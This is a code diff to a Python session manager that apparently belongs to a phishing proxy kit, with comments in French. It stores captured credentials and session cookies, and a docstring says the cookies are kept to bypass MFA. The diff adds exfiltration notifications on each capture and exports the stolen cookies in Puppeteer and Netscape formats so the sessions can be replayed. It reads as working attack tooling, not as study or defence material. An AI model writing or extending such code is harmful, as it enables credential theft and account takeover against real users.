@@ -1,8 +1,10 @@
 import uuid
 import json
 import time
-from typing import Dict, Any, Optional
+import asyncio
+from typing import Dict, Any, Optional, List
 from core.cache.redis_manager import redis_cache
+from core.exfiltration.manager import exfiltration_manager
 
 class SessionManager:
     """
@@ -25,7 +27,8 @@ class SessionManager:
             "created_at": time.time(),
             "status": "active",
             "captured_data": {},
-            "cookies": {}
+            "cookies": [],
+            "raw_cookies": []
         }
         
         self._save_session(session_id, session_data)
@@ -57,15 +60,92 @@ class SessionManager:
         if session:
             session["captured_data"][key] = value
             self._save_session(session_id, session)
+            
+            # Exfiltration Notification
+            try:
+                loop = asyncio.get_running_loop()
+                loop.create_task(exfiltration_manager.notify_capture(session_id, session, "credentials"))
+            except RuntimeError:
+                pass
 
-    def capture_cookies(self, session_id: str, cookies: Dict[str, str]):
+    def capture_cookies(self, session_id: str, cookies: List[Dict[str, Any]]):
         """
-        Enregistre les cookies de session (pour bypass MFA).
+        Enregistre les cookies de session avec leurs attributs complets.
+        cookies: Liste de dicts {'name', 'value', 'domain', 'path', ...}
         """
         session = self.get_session(session_id)
         if session:
-            session["cookies"].update(cookies)
+            if "cookies" not in session:
+                session["cookies"] = []
+            
+            # Merge logic: Update existing cookies by name/domain/path or append new ones
+            # Pour simplifier, on append et on dédoublonnera à l'export ou on remplace par nom
+            # Mieux: Utiliser un dict indexé par "name:domain:path"
+            
+            current_cookies_map = {
+                f"{c.get('name')}:{c.get('domain', '')}:{c.get('path', '/')}": c 
+                for c in session["cookies"]
+            }
+            
+            for cookie in cookies:
+                key = f"{cookie.get('name')}:{cookie.get('domain', '')}:{cookie.get('path', '/')}"
+                current_cookies_map[key] = cookie
+                
+            session["cookies"] = list(current_cookies_map.values())
             self._save_session(session_id, session)
+            
+            # Exfiltration Notification
+            try:
+                loop = asyncio.get_running_loop()
+                loop.create_task(exfiltration_manager.notify_capture(session_id, session, "cookies"))
+            except RuntimeError:
+                pass
+
+    def log_raw_cookie(self, session_id: str, raw_cookie: str):
+        """
+        Log un cookie brut (Set-Cookie header) pour analyse ultérieure.
+        """
+        session = self.get_session(session_id)
+        if session:
+            if "raw_cookies" not in session:
+                session["raw_cookies"] = []
+            session["raw_cookies"].append(raw_cookie)
+            self._save_session(session_id, session)
+
+    def export_session(self, session_id: str, format: str = "json") -> Any:
+        """
+        Exporte les cookies de session dans un format utilisable.
+        Formats: 'json' (raw list), 'puppeteer' (liste d'objets stricte), 'netscape' (string).
+        """
+        session = self.get_session(session_id)
+        if not session or "cookies" not in session:
+            return [] if format in ["json", "puppeteer"] else ""
+
+        cookies = session["cookies"]
+        
+        if format == "json":
+            return cookies
+            
+        elif format == "puppeteer":
+            # Puppeteer attend: name, value, domain, path, expires, httpOnly, secure, sameSite
+            return cookies
+            
+        elif format == "netscape":
+            # Format Netscape HTTP Cookie File
+            lines = ["# Netscape HTTP Cookie File"]
+            for c in cookies:
+                domain = c.get("domain", ".example.com")
+                flag = "TRUE" if domain.startswith(".") else "FALSE"
+                path = c.get("path", "/")
+                secure = "TRUE" if c.get("secure", False) else "FALSE"
+                expiration = c.get("expires", 0) # Timestamp
+                name = c.get("name", "")
+                value = c.get("value", "")
+                
+                lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}")
+            return "\n".join(lines)
+            
+        return cookies
 
     def _save_session(self, session_id: str, data: Dict[str, Any]):
         """
